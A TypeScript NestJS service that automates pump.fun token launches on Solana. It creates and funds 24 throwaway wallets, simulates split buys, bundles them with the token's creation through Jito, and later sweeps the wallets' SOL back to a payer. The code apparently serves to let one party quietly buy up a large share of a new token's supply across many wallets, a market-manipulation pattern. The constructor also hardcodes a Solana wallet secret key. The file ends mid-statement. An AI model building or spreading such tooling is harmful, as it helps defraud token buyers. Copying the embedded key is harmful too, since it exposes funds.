import { Inject, Injectable, forwardRef } from '@nestjs/common';
import { ConfigService } from '../../../config/config.service';
import {
  Keypair,
  Connection,
  LAMPORTS_PER_SOL,
  VersionedTransaction,
  TransactionInstruction,
  TransactionMessage,
  PublicKey,
  AddressLookupTableProgram,
  SystemProgram,
  Blockhash,
  AddressLookupTableAccount,
  SYSVAR_RENT_PUBKEY,
} from '@solana/web3.js';
import * as path from 'path';
import * as bs58 from 'bs58';
import * as fs from 'fs';
import { Web3Service } from './web3.service';
import { RadiumService } from './radium.service';
import { JitoService } from './jito.service';
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  NATIVE_MINT,
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountIdempotentInstruction,
  createTransferInstruction,
  getAssociatedTokenAddress,
  getAssociatedTokenAddressSync,
} from '@solana/spl-token';
import {
  AnchorProvider,
  Idl,
  Program,
  Wallet,
  setProvider,
  web3,
} from '@coral-xyz/anchor';
import * as BN from 'bn.js';
import axios from 'axios';
import { randomInt } from 'crypto';

const IDL = JSON.parse(
  require('fs').readFileSync('src/api/v1/web3/abis/pumpfun-IDL.json', 'utf8'),
);

interface IPoolInfo {
  [key: string]: any;
  numOfWallets?: number;
}

interface Buy {
  pubkey: PublicKey;
  solAmount: Number;
  tokenAmount: BN;
  percentSupply: number;
}

@Injectable()
export class PumpFunService {
  private readonly connection;
  private readonly wallet;
  private readonly payer;
  private readonly provider;
  private readonly program;
  private readonly poolInfo: { [key: string]: any } = {};

  private readonly PUMP_PROGRAM = new PublicKey(
    '6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P',
  );
  MPL_TOKEN_METADATA_PROGRAM_ID = new PublicKey(
    'metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s',
  );
  mintAuthority = new PublicKey('TSLvdd1pWpHVjahSpsvCXUbgwsL3JAcvokwaKt1eokM');
  global = new PublicKey('4wTV1YmiEkRvAtNtsSGPtUrqRYQMe5SKy2uB4Jjaxnjf');
  feeRecipient = new PublicKey('CebN5WGQ4jvEPvsVU4EoHEpgzq1VV7AbicfhtW4xC9iM');
  eventAuthority = new PublicKey(
    'Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1',
  );

  private readonly keypairsDir = 'pfun_keypairs';
  private readonly keyInfoPath = 'pfun_keyinfo.json';

  constructor(
    private readonly configService: ConfigService,
    @Inject(forwardRef(() => Web3Service))
    private readonly web3Service: Web3Service,
    private readonly jitoService: JitoService,
  ) {
    if (!fs.existsSync(this.keypairsDir)) {
      fs.mkdirSync(this.keypairsDir, { recursive: true });
    }

    this.wallet = Keypair.fromSecretKey(
      bs58.decode(
        '54y5x7gc9cfg6y3D8cs6gipbGCi2aTzGo28MGqM4GzNfusy38WHaYK2GuCAuPdDSUiBi1ZWhHcb4jGHF1wSFToh',
      ),
    );

    this.payer = Keypair.fromSecretKey(
      bs58.decode(this.configService.WALLET_PRIVATE_KEY),
    );

    this.connection = new Connection(this.configService.RPC_URL, {
      // RPC URL HERE
      commitment: 'confirmed',
    });

    this.provider = new AnchorProvider(this.connection, this.wallet as any, {});

    setProvider(this.provider);

    this.program = new Program(IDL as Idl, this.PUMP_PROGRAM);

    if (fs.existsSync(this.keyInfoPath)) {
      const data = fs.readFileSync(this.keyInfoPath, 'utf-8');
      this.poolInfo = JSON.parse(data);
    }
  }

  loadKeypairs(): Keypair[] {
    // Define a regular expression to match filenames like 'keypair1.json', 'keypair2.json', etc.
    const keypairRegex = /^keypair\d+\.json$/;

    return fs
      .readdirSync(this.keypairsDir)
      .filter((file) => keypairRegex.test(file)) // Use the regex to test each filename
      .map((file) => {
        const filePath = path.join(this.keypairsDir, file);
        const secretKeyString = fs.readFileSync(filePath, { encoding: 'utf8' });
        const secretKey = Uint8Array.from(JSON.parse(secretKeyString));
        return Keypair.fromSecretKey(secretKey);
      });
  }

  generateWallets(numOfWallets: number): Keypair[] {
    let wallets: Keypair[] = [];
    for (let i = 0; i < numOfWallets; i++) {
      const wallet = Keypair.generate();
      wallets.push(wallet);
    }
    return wallets;
  }

  saveKeypairToFile(keypair: Keypair, index: number) {
    const keypairPath = path.join(this.keypairsDir, `keypair${index + 1}.json`);
    fs.writeFileSync(
      keypairPath,
      JSON.stringify(Array.from(keypair.secretKey)),
    );
  }

  readKeypairs(): Keypair[] {
    const files = fs.readdirSync(this.keypairsDir);
    return files.map((file) => {
      const filePath = path.join(this.keypairsDir, file);
      const secretKey = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
      return Keypair.fromSecretKey(new Uint8Array(secretKey));
    });
  }

  updatePoolInfo(wallets: Keypair[]) {
    let poolInfo: IPoolInfo = {}; // Use the defined type here

    // Check if poolInfo.json exists and read its content
    if (fs.existsSync(this.keyInfoPath)) {
      const data = fs.readFileSync(this.keyInfoPath, 'utf8');
      poolInfo = JSON.parse(data);
    }

    // Update wallet-related information
    poolInfo.numOfWallets = wallets.length;
    wallets.forEach((wallet, index) => {
      poolInfo[`pubkey${index + 1}`] = wallet.publicKey.toString();
    });

    // Write updated data back to poolInfo.json
    fs.writeFileSync(this.keyInfoPath, JSON.stringify(poolInfo, null, 2));
  }

  async buildTxn(
    extendLUTixs: TransactionInstruction[],
    blockhash: string | Blockhash,
    lut: AddressLookupTableAccount,
  ): Promise<VersionedTransaction> {
    const messageMain = new TransactionMessage({
      payerKey: this.payer.publicKey,
      recentBlockhash: blockhash,
      instructions: extendLUTixs,
    }).compileToV0Message([lut]);
    const txn = new VersionedTransaction(messageMain);

    try {
      const serializedMsg = txn.serialize();
      console.log('Txn size:', serializedMsg.length);
      if (serializedMsg.length > 1232) {
        console.log('tx too big');
      }
      txn.sign([this.payer]);
    } catch (e) {
      const serializedMsg = txn.serialize();
      console.log('txn size:', serializedMsg.length);
      console.log(e, 'error signing extendLUT');
      process.exit(0);
    }
    return txn;
  }

  writeBuysToFile(buys: Buy[]) {
    let existingData: any = {};

    if (fs.existsSync(this.keyInfoPath)) {
      existingData = JSON.parse(fs.readFileSync(this.keyInfoPath, 'utf-8'));
    }

    // Convert buys array to an object keyed by public key
    const buysObj = buys.reduce((acc, buy) => {
      acc[buy.pubkey.toString()] = {
        solAmount: buy.solAmount.toString(),
        tokenAmount: buy.tokenAmount.toString(),
        percentSupply: buy.percentSupply,
      };
      return acc;
    }, existingData); // Initialize with existing data

    // Write updated data to file
    fs.writeFileSync(
      this.keyInfoPath,
      JSON.stringify(buysObj, null, 2),
      'utf8',
    );
    console.log('Buys have been successfully saved to keyinfo.json');
  }

  async generateSOLTransferForKeypairs(
    tipAmt: number,
    steps: number = 24,
  ): Promise<TransactionInstruction[]> {
    const keypairs: Keypair[] = this.loadKeypairs();
    const ixs: TransactionInstruction[] = [];

    let existingData: any = {};
    if (fs.existsSync(this.keyInfoPath)) {
      existingData = JSON.parse(fs.readFileSync(this.keyInfoPath, 'utf-8'));
    }

    // Dev wallet send first
    if (
      !existingData[this.wallet.publicKey.toString()] ||
      !existingData[this.wallet.publicKey.toString()].solAmount
    ) {
      console.log(`Missing solAmount for dev wallet, skipping.`);
    }

    const solAmount = parseFloat(
      existingData[this.wallet.publicKey.toString()].solAmount,
    );

    ixs.push(
      SystemProgram.transfer({
        fromPubkey: this.payer.publicKey,
        toPubkey: this.wallet.publicKey,
        lamports: Math.floor((solAmount * 1.015 + 0.0025) * LAMPORTS_PER_SOL),
      }),
    );

    // Loop through the keypairs and process each one
    for (let i = 0; i < Math.min(steps, keypairs.length); i++) {
      const keypair = keypairs[i];
      const keypairPubkeyStr = keypair.publicKey.toString();

      if (
        !existingData[keypairPubkeyStr] ||
        !existingData[keypairPubkeyStr].solAmount
      ) {
        console.log(`Missing solAmount for wallet ${i + 1}, skipping.`);
        continue;
      }

      const solAmount = parseFloat(existingData[keypairPubkeyStr].solAmount);

      try {
        ixs.push(
          SystemProgram.transfer({
            fromPubkey: this.payer.publicKey,
            toPubkey: keypair.publicKey,
            lamports: Math.floor(
              (solAmount * 1.015 + 0.0025) * LAMPORTS_PER_SOL,
            ),
          }),
        );
        console.log(
          `Sent ${(solAmount * 1.015 + 0.0025).toFixed(3)} SOL to Wallet ${i + 1
          } (${keypair.publicKey.toString()})`,
        );
      } catch (error) {
        console.error(
          `Error creating transfer instruction for wallet ${i + 1}:`,
          error,
        );
        continue;
      }
    }

    ixs.push(
      SystemProgram.transfer({
        fromPubkey: this.payer.publicKey,
        toPubkey: new PublicKey(await this.jitoService.getJitoTipAccount('')),
        lamports: BigInt(tipAmt),
      }),
    );

    return ixs;
  }

  chunkArray<T>(array: T[], chunkSize: number): T[][] {
    const chunks = [];
    for (let i = 0; i < array.length; i += chunkSize) {
      chunks.push(array.slice(i, i + chunkSize));
    }
    return chunks;
  }

  async createAndSignVersionedTxWithWallet(
    instructionsChunk: TransactionInstruction[],
    blockhash: Blockhash | string,
  ): Promise<VersionedTransaction> {
    let poolInfo: { [key: string]: any } = {};
    if (fs.existsSync(this.keyInfoPath)) {
      const data = fs.readFileSync(this.keyInfoPath, 'utf-8');
      poolInfo = JSON.parse(data);
    }

    const lut = new PublicKey(poolInfo.addressLUT.toString());

    const lookupTableAccount = (
      await this.connection.getAddressLookupTable(lut)
    ).value;

    if (lookupTableAccount == null) {
      console.log('Lookup table account not found!');
      process.exit(0);
    }

    const addressesMain: PublicKey[] = [];
    instructionsChunk.forEach((ixn) => {
      ixn.keys.forEach((key) => {
        addressesMain.push(key.pubkey);
      });
    });

    const message = new TransactionMessage({
      payerKey: this.payer.publicKey,
      recentBlockhash: blockhash,
      instructions: instructionsChunk,
    }).compileToV0Message([lookupTableAccount]);

    const versionedTx = new VersionedTransaction(message);
    const serializedMsg = versionedTx.serialize();

    console.log('Txn size:', serializedMsg.length);
    if (serializedMsg.length > 1232) {
      console.log('tx too big');
    }
    versionedTx.sign([this.payer]);

    /*
  // Simulate each txn
  const simulationResult = await connection.simulateTransaction(versionedTx, { commitment: "processed" });

  if (simulationResult.value.err) {
  console.log("Simulation error:", simulationResult.value.err);
  } else {
  console.log("Simulation success. Logs:");
  simulationResult.value.logs?.forEach(log => console.log(log));
  }
  */

    return versionedTx;
  }

  async createAndSignVersionedTxWithVoumeWallet(
    instructionsChunk: TransactionInstruction[],
    blockhash: Blockhash | string,
    wallet: Keypair,
  ): Promise<VersionedTransaction> {
    let poolInfo: { [key: string]: any } = {};
    if (fs.existsSync(this.keyInfoPath)) {
      const data = fs.readFileSync(this.keyInfoPath, 'utf-8');
      poolInfo = JSON.parse(data);
    }

    const lut = new PublicKey(poolInfo.addressLUT.toString());

    const lookupTableAccount = (
      await this.connection.getAddressLookupTable(lut)
    ).value;

    if (lookupTableAccount == null) {
      console.log('Lookup table account not found!');
      process.exit(0);
    }

    const addressesMain: PublicKey[] = [];
    instructionsChunk.forEach((ixn) => {
      ixn.keys.forEach((key) => {
        addressesMain.push(key.pubkey);
      });
    });

    const message = new TransactionMessage({
      payerKey: wallet.publicKey,
      recentBlockhash: blockhash,
      instructions: instructionsChunk,
    }).compileToV0Message([lookupTableAccount]);

    const versionedTx = new VersionedTransaction(message);
    const serializedMsg = versionedTx.serialize();

    console.log('Txn size:', serializedMsg.length);
    if (serializedMsg.length > 1232) {
      console.log('tx too big');
    }
    versionedTx.sign([wallet]);

    /*
  // Simulate each txn
  const simulationResult = await connection.simulateTransaction(versionedTx, { commitment: "processed" });

  if (simulationResult.value.err) {
  console.log("Simulation error:", simulationResult.value.err);
  } else {
  console.log("Simulation success. Logs:");
  simulationResult.value.logs?.forEach(log => console.log(log));
  }
  */

    return versionedTx;
  }

  async createAndSignVersionedTxWithKeypairs(
    instructionsChunk: TransactionInstruction[],
    blockhash: Blockhash | string,
    keypair: Keypair,
  ): Promise<VersionedTransaction> {
    let poolInfo: { [key: string]: any } = {};
    if (fs.existsSync(this.keyInfoPath)) {
      const data = fs.readFileSync(this.keyInfoPath, 'utf-8');
      poolInfo = JSON.parse(data);
    }

    const lut = new PublicKey(poolInfo.addressLUT.toString());

    const lookupTableAccount = (
      await this.connection.getAddressLookupTable(lut)
    ).value;

    if (lookupTableAccount == null) {
      console.log('Lookup table account not found!');
      process.exit(0);
    }

    const addressesMain: PublicKey[] = [];
    instructionsChunk.forEach((ixn) => {
      ixn.keys.forEach((key) => {
        addressesMain.push(key.pubkey);
      });
    });

    const message = new TransactionMessage({
      payerKey: keypair.publicKey,
      recentBlockhash: blockhash,
      instructions: instructionsChunk,
    }).compileToV0Message([lookupTableAccount]);

    const versionedTx = new VersionedTransaction(message);
    const serializedMsg = versionedTx.serialize();

    console.log('Txn size:', serializedMsg.length);
    if (serializedMsg.length > 1232) {
      console.log('tx too big');
    }
    versionedTx.sign([keypair]);

    /*
  // Simulate each txn
  const simulationResult = await connection.simulateTransaction(versionedTx, { commitment: "processed" });

  if (simulationResult.value.err) {
  console.log("Simulation error:", simulationResult.value.err);
  } else {
  console.log("Simulation success. Logs:");
  simulationResult.value.logs?.forEach(log => console.log(log));
  }
  */

    return versionedTx;
  }
  async processInstructionsSOL(
    ixs: TransactionInstruction[],
    blockhash: string | Blockhash,
  ): Promise<VersionedTransaction[]> {
    const txns: VersionedTransaction[] = [];
    const instructionChunks = this.chunkArray(ixs, 20); // Adjust the chunk size as needed

    for (let i = 0; i < instructionChunks.length; i++) {
      const versionedTx = await this.createAndSignVersionedTxWithWallet(
        instructionChunks[i],
        blockhash,
      );
      txns.push(versionedTx);
    }

    return txns;
  }

  getRandomNumberInRange(min: number, max: number): number {
    return Math.random() * (max - min) + min;
  }

  async createKeypairsForTokenCreation(body: any) {
    console.log('Hello keypairsDir ', this.keypairsDir);

    const action = body.action;
    console.log(
      "WARNING: If you create new ones, ensure you don't have SOL, OR ELSE IT WILL BE GONE.",
    );

    let wallets: Keypair[] = [];

    if (action === 'c') {
      const numOfWallets = 24; // Hardcode 24 buyer keypairs here.
      if (isNaN(numOfWallets) || numOfWallets <= 0) {
        console.log('Invalid number. Please enter a positive integer.');
        return;
      }

      wallets = this.generateWallets(numOfWallets);
      wallets.forEach((wallet, index) => {
        this.saveKeypairToFile(wallet, index);
        console.log(
          `Wallet ${index + 1} Public Key: ${wallet.publicKey.toString()}`,
        );
      });
    } else if (action === 'u') {
      wallets = this.readKeypairs();
      wallets.forEach((wallet, index) => {
        console.log(
          `Read Wallet ${index + 1} Public Key: ${wallet.publicKey.toString()}`,
        );
        console.log(
          `Read Wallet ${index + 1} Private Key: ${bs58.encode(
            wallet.secretKey,
          )}\n`,
        );
      });
    } else {
      console.log(
        'Invalid option. Please enter "c" for create or "u" for use existing.',
      );
      return;
    }

    this.updatePoolInfo(wallets);
    console.log(`${wallets.length} wallets have been processed.`);
  }

  async createLUT() {
    // -------- step 1: ask nessesary questions for LUT build --------
    const jitoTipAmt = 0.003 * LAMPORTS_PER_SOL;

    // Read existing data from poolInfo.json
    let poolInfo: { [key: string]: any } = {};
    if (fs.existsSync(this.keyInfoPath)) {
      const data = fs.readFileSync(this.keyInfoPath, 'utf-8');
      poolInfo = JSON.parse(data);
    }

    const bundledTxns: VersionedTransaction[] = [];

    // -------- step 2: create a new LUT every time there is a new launch --------
    const createLUTixs: TransactionInstruction[] = [];

    const [create, lut] = AddressLookupTableProgram.createLookupTable({
      authority: this.payer.publicKey,
      payer: this.payer.publicKey,
      recentSlot: await this.connection.getSlot('finalized'),
    });

    createLUTixs.push(
      create,
      SystemProgram.transfer({
        fromPubkey: this.payer.publicKey,
        toPubkey: new PublicKey(await this.jitoService.getJitoTipAccount('')),
        lamports: jitoTipAmt,
      }),
    );

    const addressesMain: PublicKey[] = [];
    createLUTixs.forEach((ixn) => {
      ixn.keys.forEach((key) => {
        addressesMain.push(key.pubkey);
      });
    });

    const lookupTablesMain1 =
      this.web3Service.computeIdealLookupTablesForAddresses(addressesMain);

    const { blockhash } = await this.connection.getLatestBlockhash();

    const messageMain1 = new TransactionMessage({
      payerKey: this.payer.publicKey,
      recentBlockhash: blockhash,
      instructions: createLUTixs,
    }).compileToV0Message(lookupTablesMain1);
    const createLUT = new VersionedTransaction(messageMain1);

    // Append new LUT info
    poolInfo.addressLUT = lut.toString(); // Using 'addressLUT' as the field name

    try {
      const serializedMsg = createLUT.serialize();
      console.log('Txn size:', serializedMsg.length);
      if (serializedMsg.length > 1232) {
        console.log('tx too big');
      }
      createLUT.sign([this.payer]);
    } catch (e) {
      console.log(e, 'error signing createLUT');
      process.exit(0);
    }

    // Write updated content back to poolInfo.json
    fs.writeFileSync(this.keyInfoPath, JSON.stringify(poolInfo, null, 2));

    // Push to bundle
    bundledTxns.push(createLUT);

    // -------- step 3: SEND BUNDLE --------
    await this.web3Service.sendBundleVTrxs(bundledTxns);
  }

  async extendLUT() {
    // -------- step 1: ask nessesary questions for LUT build --------
    const jitoTipAmt = 0.001 * LAMPORTS_PER_SOL;

    // Read existing data from poolInfo.json
    let poolInfo: { [key: string]: any } = {};
    if (fs.existsSync(this.keyInfoPath)) {
      const data = fs.readFileSync(this.keyInfoPath, 'utf-8');
      poolInfo = JSON.parse(data);
    }

    const bundledTxns1: VersionedTransaction[] = [];

    // -------- step 2: get all LUT addresses --------
    const accounts: PublicKey[] = []; // Array with all new keys to push to the new LUT
    const lut = new PublicKey(poolInfo.addressLUT.toString());

    const lookupTableAccount = (
      await this.connection.getAddressLookupTable(lut)
    ).value;

    console.log('lookupTableAccount ', lookupTableAccount);

    if (lookupTableAccount == null) {
      console.log('Lookup table account not found!');

      return;
    }

    // Write mint info to json
    const mintKp = Keypair.generate();
    console.log(`Mint: ${mintKp.publicKey.toString()}`);
    poolInfo.mint = mintKp.publicKey.toString();
    poolInfo.mintPk = bs58.encode(mintKp.secretKey);
    fs.writeFileSync(this.keyInfoPath, JSON.stringify(poolInfo, null, 2));

    // Fetch accounts for LUT
    const mintAuthority = new PublicKey(
      'TSLvdd1pWpHVjahSpsvCXUbgwsL3JAcvokwaKt1eokM',
    );
    const MPL_TOKEN_METADATA_PROGRAM_ID = new PublicKey(
      'metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s',
    );
    const global = new PublicKey(
      '4wTV1YmiEkRvAtNtsSGPtUrqRYQMe5SKy2uB4Jjaxnjf',
    );
    const [bondingCurve] = PublicKey.findProgramAddressSync(
      [Buffer.from('bonding-curve'), mintKp.publicKey.toBytes()],
      this.program.programId,
    );
    const [metadata] = PublicKey.findProgramAddressSync(
      [
        Buffer.from('metadata'),
        MPL_TOKEN_METADATA_PROGRAM_ID.toBytes(),
        mintKp.publicKey.toBytes(),
      ],
      MPL_TOKEN_METADATA_PROGRAM_ID,
    );
    let [associatedBondingCurve] = PublicKey.findProgramAddressSync(
      [
        bondingCurve.toBytes(),
        TOKEN_PROGRAM_ID.toBytes(),
        mintKp.publicKey.toBytes(),
      ],
      ASSOCIATED_TOKEN_PROGRAM_ID,
    );
    const eventAuthority = new PublicKey(
      'Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1',
    );
    const feeRecipient = new PublicKey(
      'CebN5WGQ4jvEPvsVU4EoHEpgzq1VV7AbicfhtW4xC9iM',
    );
    const [tokenLedger] = PublicKey.findProgramAddressSync(
      [Buffer.from('token_ledger'), this.wallet.publicKey.toBytes()],
      new PublicKey('AQU6wwuq93Vxz1dA1DF6Z1m8mhxmvepAy4qydRtBBSxb'),
    );

    // These values vary based on the new market created
    accounts.push(
      ASSOCIATED_TOKEN_PROGRAM_ID,
      TOKEN_PROGRAM_ID,
      MPL_TOKEN_METADATA_PROGRAM_ID,
      mintAuthority,
      global,
      this.program.programId,
      this.PUMP_PROGRAM,
      metadata,
      associatedBondingCurve,
      bondingCurve,
      eventAuthority,
      SystemProgram.programId,
      SYSVAR_RENT_PUBKEY,
      mintKp.publicKey,
      feeRecipient,
      tokenLedger, // tax pda
      new PublicKey('8yWSbgC9fzS3n2AZoT9tnFb2sHXVYdKS8VHmjE2DLHau'), // Tax acct
      new PublicKey('AQU6wwuq93Vxz1dA1DF6Z1m8mhxmvepAy4qydRtBBSxb'), // Tax program id
    ); // DO NOT ADD PROGRAM OR JITO TIP ACCOUNT??

    // Loop through each keypair and push its pubkey and ATAs to the accounts array
    const keypairs = this.loadKeypairs();
    for (const keypair of keypairs) {
      const ataToken = await getAssociatedTokenAddress(
        mintKp.publicKey,
        keypair.publicKey,
      );
      accounts.push(keypair.publicKey, ataToken);
    }

    // Push wallet and payer ATAs and pubkey JUST IN CASE (not sure tbh)
    const ataTokenwall = await getAssociatedTokenAddress(
      mintKp.publicKey,
      this.wallet.publicKey,
    );

    const ataTokenpayer = await getAssociatedTokenAddress(
      mintKp.publicKey,
      this.payer.publicKey,
    );

    // Add just in case
    accounts.push(
      this.wallet.publicKey,
      this.payer.publicKey,
      ataTokenwall,
      ataTokenpayer,
      lut,
      NATIVE_MINT,
    );

    // -------- step 5: push LUT addresses to a txn --------
    const extendLUTixs1: TransactionInstruction[] = [];
    const extendLUTixs2: TransactionInstruction[] = [];
    const extendLUTixs3: TransactionInstruction[] = [];
    const extendLUTixs4: TransactionInstruction[] = [];

    // Chunk accounts array into groups of 30
    const accountChunks = Array.from(
      { length: Math.ceil(accounts.length / 30) },
      (v, i) => accounts.slice(i * 30, (i + 1) * 30),
    );
    console.log('Num of chunks:', accountChunks.length);
    console.log('Num of accounts:', accounts.length);

    for (let i = 0; i < accountChunks.length; i++) {
      const chunk = accountChunks[i];
      const extendInstruction = AddressLookupTableProgram.extendLookupTable({
        lookupTable: lut,
        authority: this.payer.publicKey,
        payer: this.payer.publicKey,
        addresses: chunk,
      });
      if (i == 0) {
        extendLUTixs1.push(extendInstruction);
        console.log('Chunk:', i);
      } else if (i == 1) {
        extendLUTixs2.push(extendInstruction);
        console.log('Chunk:', i);
      } else if (i == 2) {
        extendLUTixs3.push(extendInstruction);
        console.log('Chunk:', i);
      } else if (i == 3) {
        extendLUTixs4.push(extendInstruction);
        console.log('Chunk:', i);
      }
    }

    // Add the jito tip to the last txn
    extendLUTixs4.push(
      SystemProgram.transfer({
        fromPubkey: this.payer.publicKey,
        toPubkey: new PublicKey(await this.jitoService.getJitoTipAccount('')),
        lamports: BigInt(jitoTipAmt),
      }),
    );

    // -------- step 6: seperate into 2 different bundles to complete all txns --------
    const { blockhash: block1 } = await this.connection.getLatestBlockhash();

    const extend1 = await this.buildTxn(
      extendLUTixs1,
      block1,
      lookupTableAccount,
    );
    const extend2 = await this.buildTxn(
      extendLUTixs2,
      block1,
      lookupTableAccount,
    );
    const extend3 = await this.buildTxn(
      extendLUTixs3,
      block1,
      lookupTableAccount,
    );
    const extend4 = await this.buildTxn(
      extendLUTixs4,
      block1,
      lookupTableAccount,
    );

    bundledTxns1.push(extend1, extend2, extend3, extend4);

    // -------- step 7: send bundle --------
    await this.web3Service.sendBundleVTrxs(bundledTxns1);
  }

  async simulateAndWriteBuys() {
    const keypairs = this.loadKeypairs();

    const tokenDecimals = 10 ** 6;
    const tokenTotalSupply = 1000000000 * tokenDecimals;
    let initialRealSolReserves = 0;
    let initialVirtualTokenReserves = 1073000000 * tokenDecimals;
    let initialRealTokenReserves = 793100000 * tokenDecimals;
    let totalTokensBought = 0;
    const buys: {
      pubkey: PublicKey;
      solAmount: Number;
      tokenAmount: BN;
      percentSupply: number;
    }[] = [];

    const buyAmount = this.web3Service.distributeAmount(10, 24);

    for (let it = 0; it <= 24; it++) {
      let keypair;

      let solInput;
      if (it === 0) {
        solInput = 5;
        keypair = this.wallet;
      } else {
        solInput = buyAmount[it - 1];
        console.log(`Enter the amount of SOL for wallet ${it}: ${solInput}`);
        keypair = keypairs[it - 1];
      }

      const solAmount = parseFloat(solInput) * LAMPORTS_PER_SOL;

      if (isNaN(solAmount) || solAmount <= 0) {
        console.log(`Invalid input for wallet ${it}, skipping.`);
        continue;
      }

      const e = new BN(solAmount);
      const initialVirtualSolReserves =
        30 * LAMPORTS_PER_SOL + initialRealSolReserves;
      const a = new BN(initialVirtualSolReserves).mul(
        new BN(initialVirtualTokenReserves),
      );
      const i = new BN(initialVirtualSolReserves).add(e);
      const l = a.div(i).add(new BN(1));
      let tokensToBuy = new BN(initialVirtualTokenReserves).sub(l);
      tokensToBuy = BN.min(tokensToBuy, new BN(initialRealTokenReserves));

      const tokensBought = tokensToBuy.toNumber();
      const percentSupply = (tokensBought / tokenTotalSupply) * 100;

      console.log(
        `Wallet ${it}: Bought ${tokensBought / tokenDecimals} tokens for ${e.toNumber() / LAMPORTS_PER_SOL
        } SOL`,
      );
      console.log(
        `Wallet ${it}: Owns ${percentSupply.toFixed(4)}% of total supply\n`,
      );

      buys.push({
        pubkey: keypair.publicKey,
        solAmount: Number(solInput),
        tokenAmount: tokensToBuy,
        percentSupply,
      });

      initialRealSolReserves += e.toNumber();
      initialRealTokenReserves -= tokensBought;
      initialVirtualTokenReserves -= tokensBought;
      totalTokensBought += tokensBought;
    }

    console.log(
      'Final real sol reserves: ',
      initialRealSolReserves / LAMPORTS_PER_SOL,
    );
    console.log(
      'Final real token reserves: ',
      initialRealTokenReserves / tokenDecimals,
    );
    console.log(
      'Final virtual token reserves: ',
      initialVirtualTokenReserves / tokenDecimals,
    );
    console.log('Total tokens bought: ', totalTokensBought / tokenDecimals);
    console.log(
      'Total % of tokens bought: ',
      (totalTokensBought / tokenTotalSupply) * 100,
    );
    console.log(); // \n

    this.writeBuysToFile(buys);
  }

  async generateATAandSOL() {
    const jitoTipAmt = +0.003 * LAMPORTS_PER_SOL;

    const { blockhash } = await this.connection.getLatestBlockhash();
    const sendTxns: VersionedTransaction[] = [];

    const solIxs = await this.generateSOLTransferForKeypairs(jitoTipAmt);

    const solTxns = await this.processInstructionsSOL(solIxs, blockhash);
    sendTxns.push(...solTxns);

    await this.web3Service.sendBundleVTrxs(sendTxns);
  }

  async createReturns() {
    const txsSigned: VersionedTransaction[] = [];
    const keypairs = this.loadKeypairs();
    const chunkedKeypairs = this.chunkArray(keypairs, 7); // EDIT CHUNKS?

    const jitoTipIn = '0.001';
    const TipAmt = parseFloat(jitoTipIn) * LAMPORTS_PER_SOL;

    const { blockhash } = await this.connection.getLatestBlockhash();

    // Iterate over each chunk of keypairs
    for (
      let chunkIndex = 0;
      chunkIndex < chunkedKeypairs.length;
      chunkIndex++
    ) {
      const chunk = chunkedKeypairs[chunkIndex];
      const instructionsForChunk: TransactionInstruction[] = [];

      // Iterate over each keypair in the chunk to create swap instructions
      for (let i = 0; i < chunk.length; i++) {
        const keypair = chunk[i];
        console.log(
          `Processing keypair ${i + 1}/${chunk.length}:`,
          keypair.publicKey.toString(),
        );

        const balance = await this.connection.getBalance(keypair.publicKey);
        console.log('balance of a token = ', balance);

        const sendSOLixs = SystemProgram.transfer({
          fromPubkey: keypair.publicKey,
          toPubkey: this.payer.publicKey,
          lamports: balance,
        });

        instructionsForChunk.push(sendSOLixs);
      }

      if (chunkIndex === chunkedKeypairs.length - 1) {
        const tipSwapIxn = SystemProgram.transfer({
          fromPubkey: this.payer.publicKey,
          toPubkey: new PublicKey(await this.jitoService.getJitoTipAccount('')),
          lamports: BigInt(TipAmt),
        });
        instructionsForChunk.push(tipSwapIxn);
        console.log('Jito tip added :).');
      }

      const lut = new PublicKey(this.poolInfo.addressLUT.toString());

      const lookupTableAccount = (
        await this.connection.getAddressLookupTable(lut)
      ).value;

      if (lookupTableAccount == null) {
        console.log('Lookup table account not found!');
        process.exit(0);
      }

      const message = new TransactionMessage({
        payerKey: this.payer.publicKey,
        recentBlockhash: blockhash,
        instructions: instructionsForChunk,
      }).compileToV0Message([lookupTableAccount]);

      const versionedTx = new VersionedTransaction(message);

      const serializedMsg = versionedTx.serialize();
      console.log('Txn size:', serializedMsg.length);
      if (serializedMsg.length > 1232) {
        console.log('tx too big');
      }

      console.log(
        'Signing transaction with chunk signers',
        chunk.map((kp) => kp.publicKey.toString()),
      );

      versionedTx.sign([this.payer]);

      for (const keypair of chunk) {
        versionedTx.sign([keypair]);
      }

      txsSigned.push(versionedTx);
    }

    await this.web3Service.sendBundleVTrxs(txsSigned);
  }

  async createWalletSwaps(
    blockhash: string,
    keypairs: Keypair[],
    lut: AddressLookupTableAccount,
    bondingCurve: PublicKey,
    associatedBondingCurve: PublicKey,
    mint: PublicKey,
    program: Program,
  ): Promise<VersionedTransaction[]> {
    const txsSigned: VersionedTransaction[] = [];
    const chunkedKeypairs = this.chunkArray(keypairs, 6);

    // Load keyInfo data from JSON file
    let keyInfo: {
      [key: string]: {
        solAmount: number;
        tokenAmount: string;
        percentSupply: number;
      };
    } = {};
    if (fs.existsSync(this.keyInfoPath)) {
      const existingData = fs.readFileSync(this.keyInfoPath, 'utf-8');
      keyInfo = JSON.parse(existingData);
    }

    // Iterate over each chunk of keypairs
    for (
      let chunkIndex = 0;
      chunkIndex < chunkedKeypairs.length;
      chunkIndex++
    ) {
      const chunk = chunkedKeypairs[chunkIndex];
      const instructionsForChunk: TransactionInstruction[] = [];

      // Iterate over each keypair in the chunk to create swap instructions
      for (let i = 0; i < chunk.length; i++) {
        const keypair = chunk[i];
        console.log(
          `Processing keypair ${i + 1}/${chunk.length}:`,
          keypair.publicKey.toString(),
        );

        const ataAddress = await getAssociatedTokenAddress(
          mint,
          keypair.publicKey,
        );

        const createTokenAta =
          createAssociatedTokenAccountIdempotentInstruction(
            this.payer.publicKey,
            ataAddress,
            keypair.publicKey,
            mint,
          );

        // Extract tokenAmount from keyInfo for this keypair
        const keypairInfo = keyInfo[keypair.publicKey.toString()];
        if (!keypairInfo) {
          console.log(
            `No key info found for keypair: ${keypair.publicKey.toString()}`,
          );
          continue;
        }

        // Calculate SOL amount based on tokenAmount
        const amount = new BN(keypairInfo.tokenAmount);
        const solAmount = new BN(
